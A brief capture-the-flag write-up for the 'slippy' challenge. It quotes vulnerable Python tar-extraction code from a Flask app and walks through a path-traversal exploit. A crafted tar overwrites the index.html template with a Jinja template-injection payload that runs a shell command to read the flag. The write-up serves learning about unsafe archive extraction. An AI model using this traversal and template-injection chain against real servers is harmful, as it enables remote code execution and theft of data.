# slippy

It comes with a Dockerfile, so I'd recommend building and running a local instacne for testing. (just install docker and run the build-docker.sh script)

From looking at the source code (util.py):
```py
def extract_from_archive(file):
    tmp  = tempfile.gettempdir()
    path = os.path.join(tmp, file.filename)
    file.save(path)

    if tarfile.is_tarfile(path):
        tar = tarfile.open(path, 'r:gz')
        tar.extractall(tmp)

        extractdir = f'{main.app.config["UPLOAD_FOLDER"]}/{generate(15)}'
        os.makedirs(extractdir, exist_ok=True)

        extracted_filenames = []

        for tarinfo in tar:
            name = tarinfo.name
            if tarinfo.isreg():
                filename = f'{extractdir}/{name}'
                os.rename(os.path.join(tmp, name), filename)
                extracted_filenames.append(filename)
                continue
            
            os.makedirs(f'{extractdir}/{name}', exist_ok=True)

        tar.close()
        return extracted_filenames

    return False

```

It seems the app extracts the tar archive without sanitizing/checking where it goes. Searching python tar vulnerability comes up with some issues:

it looks like a tar exploit (https://bugs.python.org/issue21109). 

So, I could backdoor the index.html template with print flag code, then create a tar archive and upload it.

add this line of code in index.html: 
https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/
`{{ self.__init__.__globals__.__builtins__.__import__('subprocess').check_output('cat /app/flag',shell=1) }}`


(-P option in tar is to allow weird paths like / and ../)

You need to make sure you are in the correct depth (just make some deep folders and cd into them) then do this:

`tar cPzvf index.tgz ../../../templates/index.html`

then upload the archive, and refresh the page :)
